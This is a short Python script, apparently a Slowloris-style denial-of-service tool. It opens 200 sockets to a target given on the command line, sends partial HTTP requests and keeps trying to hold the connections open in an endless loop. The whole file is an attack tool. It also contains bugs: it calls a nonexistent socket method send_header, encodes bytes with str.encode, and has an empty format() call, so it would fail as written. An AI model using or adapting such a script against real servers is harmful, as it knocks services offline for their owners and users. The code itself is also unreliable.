import sys
import socket
import random

STANDARD_GET_REQUEST = "GET /?{} HTTP/1.1\r\n"
STANDARD_GET_REQUEST_HEADER = ["Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
                               "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
                               "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
                               "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0",
                               "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
                               "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0"
]
SOCKET_CONNECTIONS = []

def create_connection(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    SOCKET_CONNECTIONS.append(s)

def initiateAttack(ip, port):
    for _ in range(200):
        create_connection(ip, port)

    for s in SOCKET_CONNECTIONS:
        s.send(str.encode(STANDARD_GET_REQUEST.format(random.randint(0, 2000)).encode('utf-8')))

    while True:
        for connection in SOCKET_CONNECTIONS:
            try:
                connection.send_header("X-a", random.randint(1,2000))
            except socket.error:
                SOCKET_CONNECTIONS.remove(connection)
        
        for _ in range(200 - len(SOCKET_CONNECTIONS)):
            create_connection(ip, port)

        print("Socket Count: {0}".format())

def main():
    ip = sys.argv[1]
    port = sys.argv[2]
    initiateAttack(ip, int(port))

if __name__ == "__main__":
    main()